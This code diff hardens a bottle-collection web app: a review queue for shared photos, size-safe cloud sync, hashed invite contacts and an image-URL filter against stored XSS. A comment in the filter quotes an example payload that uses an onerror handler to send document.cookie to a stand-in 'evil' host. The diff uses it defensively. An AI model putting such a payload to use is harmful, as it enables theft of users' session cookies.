@@ -927,21 +927,24 @@ async function loadSharedBottlePhotos() {
 
 async function shareBottlePhoto(bottle) {
   if (!currentUser || !db || !bottle.imageUrl) return;
-  const key = curatedImageKey(bottle.name, bottle.distillery).replaceAll("/", "-");
+  // Community photos are no longer published directly by clients. Only a real
+  // Storage-hosted photo can become public (skip inline data: URLs), and it now
+  // goes into a review queue that an admin/Cloud Function approves into the
+  // public catalog (sharedBottlePhotos). See firestore.rules.
+  if (!/^https:\/\//i.test(bottle.imageUrl)) return;
   const statusEl = document.querySelector("#quickPhotoStatus");
   try {
-    await db.collection("sharedBottlePhotos").doc(key).set({
-      name: bottle.name,
-      distillery: bottle.distillery,
+    await db.collection("bottleSubmissions").add({
+      name: bottle.name || "",
+      distillery: bottle.distillery || "",
       imageUrl: bottle.imageUrl,
       submittedBy: currentUser.uid,
       submittedAt: Date.now(),
     });
-    sharedCuratedImages.set(key, bottle.imageUrl);
-    if (statusEl) statusEl.textContent = "✓ Shared with everyone";
+    if (statusEl) statusEl.textContent = "✓ Submitted for review";
   } catch (error) {
-    console.error("Failed to share bottle photo", error);
-    if (statusEl) statusEl.textContent = "Could not share this photo. Try again.";
+    console.error("Failed to submit bottle photo", error);
+    if (statusEl) statusEl.textContent = "Could not submit this photo. Try again.";
   }
 }
 
@@ -2349,13 +2352,167 @@ function userDocRef(uid) {
   return db.collection("users").doc(uid);
 }
 
+// --- Cloud-sync safety -------------------------------------------------------
+// The whole collection syncs as a single Firestore document, which has a hard
+// 1 MiB limit. Bottles added before sign-in store their photo as a base64
+// `data:` URL inline; a few of those can push the document over the limit, and
+// the write would then fail silently. These helpers keep the synced document
+// under the limit and make any failure visible instead of silent.
+const SAFE_DOC_BYTES = 900 * 1024; // headroom below Firestore's 1 MiB doc limit
+let cloudPhotoTrimWarned = false; // one-shot per session (push runs on every save)
+let cloudSyncErrorWarned = false; // reset on a successful write
+
+function isDataUrl(value) {
+  return typeof value === "string" && /^data:/i.test(value.trim());
+}
+
+function estimateJsonBytes(obj) {
+  try {
+    return new Blob([JSON.stringify(obj)]).size;
+  } catch {
+    return JSON.stringify(obj).length; // rough fallback
+  }
+}
+
+// Cloud copies with inline `data:` photos removed. The local copies keep their
+// images; preserveLocalImages() restores them on the next pull.
+function cloudSafeBottles(list) {
+  return (list || []).map((bottle) => {
+    const copy = { ...bottle };
+    if (isDataUrl(copy.imageUrl)) copy.imageUrl = "";
+    if (Array.isArray(copy.gallery)) {
+      copy.gallery = copy.gallery.filter((photo) => photo && !isDataUrl(photo.url));
+    }
+    return copy;
+  });
+}
+
+function cloudSafePours(list) {
+  return (list || []).map((pour) => {
+    const copy = { ...pour };
+    ["photoUrl", "imageUrl", "memoryPhotoUrl"].forEach((key) => {
+      if (isDataUrl(copy[key])) copy[key] = "";
+    });
+    return copy;
+  });
+}
+
+// When the cloud copy of a bottle has no image (e.g. its inline photo was
+// trimmed on a previous push), keep the image we still have locally so a pull
+// doesn't erase the user's photo.
+function preserveLocalImages(cloudBottles, localBottles) {
+  const localById = new Map((localBottles || []).map((b) => [b.id, b]));
+  return (cloudBottles || []).map((b) => {
+    if (!b.imageUrl) {
+      const local = localById.get(b.id);
+      if (local && local.imageUrl) return { ...b, imageUrl: local.imageUrl };
+    }
+    return b;
+  });
+}
+
+function bottleTimestamp(b) {
+  return Number((b && (b.updatedAt || b.createdAt)) || 0);
+}
+function pourTimestamp(p) {
+  if (!p) return 0;
+  if (p.updatedAt) return Number(p.updatedAt) || 0;
+  if (p.date) {
+    const t = new Date(`${p.date}T12:00:00`).getTime();
+    if (!Number.isNaN(t)) return t;
+  }
+  return 0;
+}
+
+// Union two lists by id, keeping the newer of any item on both sides. Local
+// wins ties, so work done offline (which the cloud hasn't seen yet) survives
+// sign-in instead of being overwritten by an older cloud copy. Without deletion
+// tombstones this can resurrect an item deleted on another device — an accepted
+// trade-off versus losing unsynced local work.
+function mergeById(localList, cloudList, getTs) {
+  const byId = new Map();
+  (cloudList || []).forEach((item) => {
+    if (item && item.id != null) byId.set(item.id, item);
+  });
+  (localList || []).forEach((item) => {
+    if (!item || item.id == null) return;
+    const existing = byId.get(item.id);
+    if (!existing || getTs(item) >= getTs(existing)) byId.set(item.id, item);
+  });
+  return Array.from(byId.values());
+}
+
+// Upload any inline base64 (`data:`) photos to Cloud Storage and replace them
+// with the download URL, so photos added before sign-in sync across devices as
+// small URLs instead of bloating the user document (and triggering the trim in
+// pushCloudData). Best-effort and per-item: a failed upload leaves the local
+// data: URL in place (still shown locally). Returns true if anything changed.
+async function migrateLocalPhotosToStorage() {
+  if (!currentUser || !storage) return false;
+  let changed = false;
+  const upload = async (dataUrl, tag) => {
+    const blob = await (await fetch(dataUrl)).blob();
+    const path = `bottle-photos/${currentUser.uid}/${Date.now()}-${tag}-${Math.random().toString(36).slice(2, 8)}.jpg`;
+    return uploadFileToStorage(blob, path);
+  };
+  for (const bottle of bottles) {
+    if (isDataUrl(bottle.imageUrl)) {
+      try {
+        bottle.imageUrl = await upload(bottle.imageUrl, "main");
+        changed = true;
+      } catch (error) {
+        console.warn("Photo migration (bottle) skipped", error);
+      }
+    }
+    if (Array.isArray(bottle.gallery)) {
+      for (const photo of bottle.gallery) {
+        if (photo && isDataUrl(photo.url)) {
+          try {
+            photo.url = await upload(photo.url, "gallery");
+            changed = true;
+          } catch (error) {
+            console.warn("Photo migration (gallery) skipped", error);
+          }
+        }
+      }
+    }
+  }
+  for (const pour of pours) {
+    for (const key of ["photoUrl", "imageUrl", "memoryPhotoUrl"]) {
+      if (isDataUrl(pour[key])) {
+        try {
+          pour[key] = await upload(pour[key], "pour");
+          changed = true;
+        } catch (error) {
+          console.warn("Photo migration (pour) skipped", error);
+        }
+      }
+    }
+  }
+  if (changed) {
+    localStorage.setItem(STORAGE_KEY, JSON.stringify(bottles));
+    localStorage.setItem(POUR_STORAGE_KEY, JSON.stringify(pours));
+  }
+  return changed;
+}
+
 async function pullCloudData(uid) {
+  // In-memory bottles/pours == the localStorage copy at this point, before the
+  // cloud is folded in. Kept so a sign-in merges (rather than overwrites) any
+  // work done offline, instead of the older cloud copy clobbering it.
+  const localBottles = bottles;
+  const localPours = pours;
   try {
     const snap = await userDocRef(uid).get();
     if (snap.exists) {
       const data = snap.data();
-      bottles = (data.bottles || []).map(normalizeBottle);
-      pours = data.pours || [];
+      const cloudBottles = preserveLocalImages((data.bottles || []).map(normalizeBottle), localBottles);
+      // Merge by id, newest-per-item wins — preserves offline additions on this
+      // device while still picking up newer edits made on another device.
+      bottles = mergeById(localBottles, cloudBottles, bottleTimestamp);
+      pours = mergeById(localPours, data.pours || [], pourTimestamp);
+      // infinityBottles stay cloud-authoritative (entries may lack ids, so a
+      // merge-by-id could drop them); this preserves the prior behavior.
       infinityBottles = (data.infinityBottles || []).map((entry) => ({ additions: [], notes: "", ...entry }));
       currentProfile = {
         username: data.username || "",
@@ -2375,9 +2532,14 @@ async function pullCloudData(uid) {
       });
       if (libraryChanged) renderDistilleryOptions();
       persistCustomLibrary();
+      // Upload any pre-sign-in inline photos, then push the merged result so the
+      // cloud picks up offline additions (with photos now hosted in Storage).
+      await migrateLocalPhotosToStorage();
+      pushCloudData();
     } else {
       currentProfile = { username: "" };
-      await userDocRef(uid).set({ bottles, pours, infinityBottles, customLibrary, username: "", updatedAt: Date.now() });
+      await migrateLocalPhotosToStorage();
+      pushCloudData();
     }
     syncCoreBarScores();
     updateAccountUI();
@@ -2391,22 +2553,41 @@ async function pullCloudData(uid) {
 
 async function pushCloudData() {
   if (!currentUser || !db) return;
+  const base = {
+    infinityBottles,
+    customLibrary,
+    username: currentProfile?.username || "",
+    greetingMode: localStorage.getItem(GREETING_MODE_KEY) || "username",
+    greetingName: localStorage.getItem(GREETING_NAME_KEY) || "",
+    updatedAt: Date.now(),
+  };
+  let payload = { ...base, bottles, pours };
+  let trimmedPhotos = false;
+  // Only strip inline photos when the document would exceed the safe size, so
+  // users whose collection fits keep syncing their photos as before.
+  if (estimateJsonBytes(payload) > SAFE_DOC_BYTES) {
+    payload = { ...base, bottles: cloudSafeBottles(bottles), pours: cloudSafePours(pours) };
+    trimmedPhotos = true;
+  }
   try {
-    await userDocRef(currentUser.uid).set(
-      {
-        bottles,
-        pours,
-        infinityBottles,
-        customLibrary,
-        username: currentProfile?.username || "",
-        greetingMode: localStorage.getItem(GREETING_MODE_KEY) || "username",
-        greetingName: localStorage.getItem(GREETING_NAME_KEY) || "",
-        updatedAt: Date.now(),
-      },
-      { merge: true },
-    );
+    await userDocRef(currentUser.uid).set(payload, { merge: true });
+    cloudSyncErrorWarned = false;
+    if (trimmedPhotos && !cloudPhotoTrimWarned) {
+      cloudPhotoTrimWarned = true;
+      showToast(
+        "Some photos are too large to sync, so they're kept on this device only — your bottles and notes did sync.",
+        { icon: "📸" },
+      );
+    }
   } catch (error) {
     console.error("Cloud sync failed to save", error);
+    if (!cloudSyncErrorWarned) {
+      cloudSyncErrorWarned = true;
+      showToast(
+        "Couldn't save your latest changes to the cloud. They're safe on this device and will sync when the connection recovers.",
+        { icon: "⚠️" },
+      );
+    }
   }
 }
 
@@ -2739,14 +2920,33 @@ function selectInviteMethod(method) {
 }
 
 // Best-effort record of who invited whom. Never blocks the actual invite.
-function logInvite(method, contact) {
+async function sha256Hex(text) {
+  const data = new TextEncoder().encode(text);
+  const buf = await crypto.subtle.digest("SHA-256", data);
+  return Array.from(new Uint8Array(buf))
+    .map((b) => b.toString(16).padStart(2, "0"))
+    .join("");
+}
+
+async function logInvite(method, contact) {
   if (!currentUser || !db) return;
+  // Store only a hash of the invitee's contact, never the raw email/phone/
+  // handle — that's a third party who hasn't consented to us keeping their
+  // address. The hash still lets us recognize an accepted invite later without
+  // holding PII. (Invites are also write-only for clients per firestore.rules.)
+  let contactHash = "";
+  try {
+    const normalized = String(contact || "").trim().toLowerCase();
+    if (normalized) contactHash = await sha256Hex(normalized);
+  } catch (error) {
+    console.warn("Invite hash skipped", error);
+  }
   db.collection("invites")
     .add({
       inviterUid: currentUser.uid,
       inviterUsername: currentProfile?.username || "",
       method,
-      contact: contact || "",
+      contactHash,
       createdAt: Date.now(),
     })
     .catch((error) => console.warn("Invite log skipped", error));
@@ -3842,7 +4042,7 @@ function renderBottleMetaLine(bottle) {
 }
 
 function renderCollectionBottleImage(bottle) {
-  const image = bottle.imageUrl || getCuratedBottleImage(bottle);
+  const image = safeImageUrl(bottle.imageUrl) || safeImageUrl(getCuratedBottleImage(bottle));
   if (image) {
     return `<img class="collection-bottle-image" src="${image}" alt="${escapeHtml(bottle.name)} bottle" />`;
   }
@@ -8702,9 +8902,30 @@ function renderBottleDetailView() {
   });
 }
 
+// Only allow image URLs we produce or trust, and reject anything containing
+// characters that could terminate an HTML attribute or inject markup. Bottle
+// data is rendered cross-user (a friend's cabinet renders your bottles), so a
+// malicious imageUrl like `x" onerror="fetch(evil+document.cookie)` would be
+// stored XSS if interpolated raw into src="...". Returns "" for anything
+// unsafe so callers fall back to the placeholder. The value it returns is a
+// raw (un-escaped) URL with no attribute-breaking characters, so it is safe in
+// both `src="${...}"` markup and `img.src = ...` property assignments.
+const SAFE_IMAGE_DATA = /^data:image\/(?:jpeg|jpg|png|gif|webp);/i;
+function safeImageUrl(url) {
+  const value = String(url == null ? "" : url).trim();
+  if (!value) return "";
+  if (SAFE_IMAGE_DATA.test(value)) return value; // our own downscaled JPEGs + the placeholder GIF
+  if (/[<>"'`\\\s]/.test(value)) return ""; // block attribute breakout / markup injection
+  const lower = value.toLowerCase();
+  if (lower.startsWith("https://") || lower.startsWith("blob:")) return value;
+  if (/^(?:\.?\/|assets\/|public\/)/.test(value)) return value; // bundled relative paths
+  return ""; // reject http:, javascript:, data:image/svg+xml, and anything else
+}
+
 function bottleImage(bottle) {
-  if (bottle.imageUrl) return bottle.imageUrl;
-  const curatedImage = getCuratedBottleImage(bottle);
+  const own = safeImageUrl(bottle.imageUrl);
+  if (own) return own;
+  const curatedImage = safeImageUrl(getCuratedBottleImage(bottle));
   if (curatedImage) return curatedImage;
   return "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==";
 }
@@ -8712,7 +8933,7 @@ function bottleImage(bottle) {
 // A real photo when we have one, otherwise a clean initial tile instead of a blank box.
 function bottleThumb(bottle, extraClass = "") {
   const cls = `catalog-thumb${extraClass ? ` ${extraClass}` : ""}`;
-  const image = bottle.imageUrl || getCuratedBottleImage(bottle);
+  const image = safeImageUrl(bottle.imageUrl) || safeImageUrl(getCuratedBottleImage(bottle));
   if (image) {
     return `<img class="${cls}" src="${image}" alt="${escapeHtml(bottle.name)} bottle" />`;
   }
